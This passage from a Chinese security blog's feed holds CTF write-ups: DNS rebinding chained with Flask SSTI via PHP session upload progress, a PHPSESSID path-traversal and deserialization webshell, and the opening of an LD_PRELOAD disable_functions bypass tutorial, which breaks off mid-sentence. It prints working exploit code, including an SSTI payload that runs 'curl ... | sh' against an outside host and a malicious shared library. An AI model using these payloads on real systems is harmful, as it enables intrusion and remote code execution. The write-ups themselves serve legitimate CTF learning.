class="string">'🇰🇷🐟'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($dst)) <span class="keyword">exit</span>(<span class="string">"Forbidden"</span>);</span><br><span class="line"></span><br><span class="line">$res = @parse_url($dst);</span><br><span class="line">$ip = @dns_get_record($res[<span class="string">'host'</span>], DNS_A)[<span class="number">0</span>][<span class="string">'ip'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($res[<span class="string">'scheme'</span>] !== <span class="string">'http'</span> &amp;&amp; $res[<span class="string">'scheme'</span>] !== <span class="string">'https'</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"><span class="keyword">if</span>(stripos($res[<span class="string">'path'</span>], <span class="string">"korea"</span>) === <span class="keyword">FALSE</span>) <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($waf); $i++) </span><br><span class="line">    <span class="keyword">if</span>(stripos($dst, $waf[$i]) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;svg/onload=\"alert('發大財!')\"&gt;"</span>.$waf[$i]);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// u can only touch this useless ip :p</span></span><br><span class="line">$dev_ip = <span class="string">"54.87.54.87"</span>;</span><br><span class="line"><span class="keyword">if</span>($ip === $dev_ip) &#123;</span><br><span class="line">    $content = file_get_contents($dst);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先通过parse_url解析域名拿到对应ip，接下来判断协议，并且判断路径中是否存在korea,如果不存在的话就返回Error，这个限制条件需要我们是http或者https协议，并且在path中有korea，接下来再去检测payload有无waf数组关键字，最后如果$ip等于给定的ip就会通过file_get_contents去访问我们payload。</p>
<p>在上面我们可以发现dns_get_record函数，这是用来获取主机的DNS记录的函数，题目中是通过这个函数先去拿到ip,最后再去file_get_contents我们的域名payload。</p>
<p>那么这里就可以通过dns重绑定攻击来实现第一次拿到的是题目中需要54.87.54.87这个ip，第二次file_get_contents直接去访问我们的payload域名，那么第二次解析的就是127.0.0.1了，这样就可以看到内网的flask服务器了</p>
<p>dns重绑定攻击在线网站（真的好用）</p>
<p><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p>首先还是先写一下dns重绑定攻击的原理：</p>
<ul>
<li>在我们给浏览器我们想要访问的域名的时候，浏览器通过向DNS服务器发送请求将输入的域名解析为对应的IP</li>
<li>TTL概念：TTL表示DNS里面域名和IP绑定关系的Cache在DNS上存活的最长时间。当请求了这个域名并且通过dns服务器把这个域名解析为对应的ip后，那么这个关系就会被缓存，缓存的时间称为TTL，当缓存失效后，这个域名和ip的关系就会失效，再次请求域名的话，则会重新匹配对应的ip</li>
</ul>
<blockquote>
<p>而dns就是利用这个来实现的。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p>
</blockquote>
<p>DNS重绑定攻击最好的TTL时间就是0，第二次访问这个域名直接解析到另一个ip上</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KdqoJH.png" alt="KdqoJH.png"></p>
<p>接着分析flask部分的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, render_template_string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ping')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"pong"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"🇹🇼"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/koreafish')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">koreafish</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        id = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'fish.html'</span>, id=id)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=no_id.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/koreacat')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        id = request.args.get(<span class="string">"id"</span>)</span><br><span class="line">        <span class="keyword">if</span> int(id) &gt; <span class="number">5</span> <span class="keyword">or</span> int(id) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=id_range.html"</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'cat.html'</span>, id=id)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/error_page?err=no_id.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>关键漏洞部分代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/error_page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">()</span>:</span></span><br><span class="line">    error_status = request.args.get(<span class="string">"err"</span>)</span><br><span class="line">    err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br><span class="line">    <span class="keyword">with</span> open(err_temp_path, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().strip()</span><br><span class="line">    <span class="keyword">return</span> render_template_string(sanitize(content))</span><br></pre></td></tr></table></figure>

<p>看来这里调用了render_template_string，那么这样是存在SSTI的，跟进sanitize函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize</span><span class="params">(str)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"&#123;&#123;"</span>, <span class="string">""</span>)</span><br></pre></td></tr></table></figure>

<p>进行了一些常见的ssti过滤</p>
<p>接着来看这个函数</p>
<p>error_status通过get型参数err进行获取，通过组合拿到文件路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">err_temp_path = os.path.join(<span class="string">'/var/www/flask/'</span>, <span class="string">'error'</span>, error_status)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>os.path.join是有一个很有趣的函数</p>
<p>os.path.join()函数</p>
<p>语法：  os.path.join(path1[,path2[,……]])</p>
<p>返回值：将多个路径组合后返回</p>
<p>注：第一个绝对路径之前的参数将被忽略</p>
</blockquote>
<p>有趣的点就是绝对路径之前的参数将被忽略</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KwSYr9.png" alt="KwSYr9.png"></p>
<p>那么接下来找到一个可控文件就可以了，控制里面的内容，通过Flask的这个服务打开这个路径的内容，进行SSTI。</p>
<p>我们可以通过PHP_SESSION_UPLOAD_PROGRESS得到可控数据，成功SSTI。</p>
<p>这里比HITCON2018的 One-line-php-challenge是要舒服一些的，因为在hitcon2018中，orange师傅把这个文件的开头字符限制了，所以必须要通过多次base64-decode才能实现，这个就不用了，直接SSTI就可以了。官方exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish4.balsnctf.com/index.php'</span></span><br><span class="line">sess_name = <span class="string">'iamkaibro'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line">// [].__class__===[][<span class="string">'__class__'</span>]  //SSTI过滤Bypass</span><br><span class="line">// &#123;&#123;&#125;&#125;-&gt;&#123;% %&#125; //SSTI过滤Bypassa</span><br><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">&#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">&#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">&#123;% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %&#125;&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<h3 id="巅峰极客lol"><a href="#巅峰极客lol" class="headerlink" title="巅峰极客lol"></a>巅峰极客lol</h3><p>这道题的主要问题在于源码的下载，只要下载出来源码，我们就可以看出是session反序列化了。</p>
<p>文件上传上去生成文件如：upload/phpsessid/phpsessid.jpg</p>
<p>同样文件的下载也是通过phpsessid，赛后看源码可以更清楚的看到这一点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($param)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Download(Upload_DIR.DS.<span class="keyword">$this</span>-&gt;data[<span class="string">'param'</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="comment">//define('Upload_DIR',Image_DIR.DS.session_id());</span></span><br><span class="line"><span class="comment">//define('Image_DIR',APP_DIR.DS.'upload');</span></span><br></pre></td></tr></table></figure>

<p>那么比如想要下载index.php的话</p>
<p>Payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">download&#x2F;index.php</span><br><span class="line"></span><br><span class="line">PHPSESSID&#x3D;upload&#x2F;..&#x2F;..&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>即可成功下载index.php</p>
<p>在index.php是有其他文件的路劲的，通过上面的方法即可把所有源码下载完毕</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'DS'</span>) <span class="keyword">or</span> define(<span class="string">'DS'</span>, DIRECTORY_SEPARATOR);</span><br><span class="line">define(<span class="string">'APP_DIR'</span>, realpath(<span class="string">'./'</span>));</span><br><span class="line">define(<span class="string">'Cache_DIR'</span>,APP_DIR.DS.<span class="string">'user'</span>);</span><br><span class="line">define(<span class="string">'View_DIR'</span>,APP_DIR.DS.<span class="string">'app'</span>.DS.<span class="string">'view'</span>);</span><br><span class="line">define(<span class="string">'Core_DIR'</span>,APP_DIR.DS.<span class="string">'core'</span>);</span><br><span class="line">define(<span class="string">'Image_DIR'</span>,APP_DIR.DS.<span class="string">'upload'</span>);</span><br><span class="line"><span class="keyword">include</span>(Core_DIR.DS.<span class="string">'core.php'</span>);</span><br></pre></td></tr></table></figure>

<p>主要漏洞点在于Cache.class.php缓存</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'name'</span>])?$data[<span class="string">'post'</span>][<span class="string">'name'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="keyword">isset</span>($data[<span class="string">'post'</span>][<span class="string">'message'</span>])?$data[<span class="string">'post'</span>][<span class="string">'message'</span>]:<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=!<span class="keyword">empty</span>($data[<span class="string">'image'</span>])?$data[<span class="string">'image'</span>]:<span class="string">'/static/images/pic04.jpg'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=Cache_DIR.DS.session_id().<span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;html=sprintf(<span class="string">'&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;LOL&lt;/title&gt;&lt;meta charset="utf-8" /&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /&gt;&lt;link rel="stylesheet" href="/static/css/main.css" /&gt;&lt;noscript&gt;&lt;link rel="stylesheet" href="/static/css/noscript.css" /&gt;&lt;/noscript&gt;   &lt;/head&gt; &lt;body class="is-preload"&gt;&lt;div id="wrapper"&gt;&lt;header id="header"&gt; &lt;div class="logo"&gt;&lt;span class="icon fa-diamond"&gt;&lt;/span&gt; &lt;/div&gt;  &lt;div class="content"&gt;&lt;div class="inner"&gt;    &lt;h1&gt;Hero of you&lt;/h1&gt;&lt;/div&gt;  &lt;/div&gt;  &lt;nav&gt;&lt;ul&gt;   &lt;li&gt;&lt;a href="#you"&gt;YOU&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;    &lt;/nav&gt;&lt;/header&gt;&lt;div id="main"&gt;&lt;article id="you"&gt;    &lt;h2 class="major" ng-app&gt;%s&lt;/h2&gt;    &lt;span class="image main"&gt;&lt;img src="%s" alt="" /&gt;&lt;/span&gt; &lt;p&gt;%s&lt;/p&gt;&lt;button type="button" onclick=location.href="/download/%s"&gt;下载&lt;/button&gt;&lt;/article&gt;&lt;/div&gt;&lt;footer id="footer"&gt;&lt;/footer&gt;&lt;/div&gt;&lt;script src="/static/js/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/browser.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/breakpoints.min.js"&gt;&lt;/script&gt;&lt;script src="/static/js/util.js"&gt;&lt;/script&gt;&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;&lt;script src="/static/js/angular.js"&gt;&lt;/script&gt;   &lt;/body&gt;&lt;/html&gt;'</span>,substr(<span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>],<span class="number">0</span>,<span class="number">62</span>),<span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>],<span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>],session_id().<span class="string">'.jpg'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本意看起来像是把上传文件的缓存放到core目录下</p>
<p>直接通过反序列化控制data数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">public</span> $sj;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $html;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'name'</span>]=<span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'message'</span>]=<span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'image'</span>]=<span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path=<span class="string">"/var/www/html/shell.php"</span>    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;html))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xx"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将反序列化数据上传上去</p>
<p>最终拿到shell。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Bypass disabled_functions &amp; open_basedir-php</title>
    <url>/2019/10/09/Bypass-disabled-functions-open-basedir-php/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很多情况下我们会遇到拿到webshell，却无法拿到我们想要数据的情况，被服务器所设置的open_basedir和disabled_functions所限制，下面写的就是一些bypass方法了。</p>
<h3 id="bypass-disabled-functions"><a href="#bypass-disabled-functions" class="headerlink" title="bypass disabled_functions"></a>bypass disabled_functions</h3><h4 id="寻找遗漏危险函数"><a href="#寻找遗漏危险函数" class="headerlink" title="寻找遗漏危险函数"></a>寻找遗漏危险函数</h4><p>一般被遗漏的危险函数都是如popen,proc_open(),pcntl_exec()这样的函数，比如在国决Day1的web11</p>
<p><a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown</a></p>
<p>在disabled_functions就存在未过滤popen的情况，这样最后就可以不用去引入恶意so了</p>
<p>下面是当时disabled_functions的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,mail,passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br></pre></td></tr></table></figure>

<h4 id="利用LD-PRELOAD"><a href="#利用LD-PRELOAD" class="headerlink" title="利用LD_PRELOAD"></a>利用LD_PRELOAD</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote>
<p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p>
</blockquote>
<p>从上面可以看出本来LD_PRELOAD的作用是利用我们加载进来的so，去覆盖相同函数名的库函数，去使用自己的函数，更加方便，但是如果自己的函数为恶意函数，就造成了恶意程序注入。</p>
<h5 id="动态链接与静态链接"><a href="#动态链接与静态链接" class="headerlink" title="动态链接与静态链接"></a>动态链接与静态链接</h5><blockquote>
<p>一般来说，程序的链接分为静态链接和动态链接，静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明的，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、发布，对于程序的维护产生了比较大的工作量。</p>
<p>有得就有失。动态链接所带来的坏处和其好处一样同样是巨大的。因为程序在运行时动态加载函数，这也就为他人创造了可以影响你的主程序的机会。试想，一旦，你的程序动态载入的函数不是你自己写的，而是载入了别人的有企图的代码，通过函数的返回值来控制你的程序的执行流程，那么，你的程序也就被人“劫持”了。</p>
</blockquote>
<p>可以看出虽然动态链接增添了很多方便，但同时也增加了不少风险度，比如我们可以引入自己的so文件，里面写好我们想要的执行内容的库函数，这样就会导致覆盖了原来正常的库函数，造成函数劫持</p>
<p>对LD_PRELOAD的利用大概可分为两种，第一种是劫持库函数，第二种是劫持启动进程</p>
<h5 id="劫持库函数"><a href="#劫持库函数" class="headerlink" title="劫持库函数"></a>劫持库函数</h5><p>网上大多数都是劫持的getuid，其实能劫持的并不只getuid,我们需要劫持的函数需要满足，此函数为点：<strong>经常被用到的并且为无参数的函数</strong></p>
<p>比如getuid,getpid,getgid,getppid这种，具体的可以fuzz一下，应该蛮多的</p>
<p>具体操作过程(以geteuid的劫持为例)</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"whoami &gt; hack"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成so文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>

<p>写一个hack.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);<span class="comment">//error_log('',1);</span></span><br><span class="line"><span class="comment">//imap_mail('a@a',1,1,1,1);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里能调用的函数不止有mail，在mail函数被ban掉的情况下也可以用error_log，imap_mail等，需要注意的是error_log的第二个参数需要设置为1表示发送邮件会调用sendmail进程，imap_mail也可调用sendmail进程，即可调用sendmail子进程，下面放一下对比图，就不演示具体的过程了</p>
<p><img src="https://s2.ax1x.com/2019/10/03/uwQjHJ.png" alt="uwQjHJ.png"></p>
<p>可以看到这里都调用了sendmail进程。</p>
<h5 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h5><p>从上面来看，劫持库函数需要找到特定的库函数去劫持，那么劫持新进程是不需要找到特定的库函数的。</p>
<blockquote>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
</blockquote>
<p>__attribute__((constructor))更加直接的去讲：有这个说明：</p>
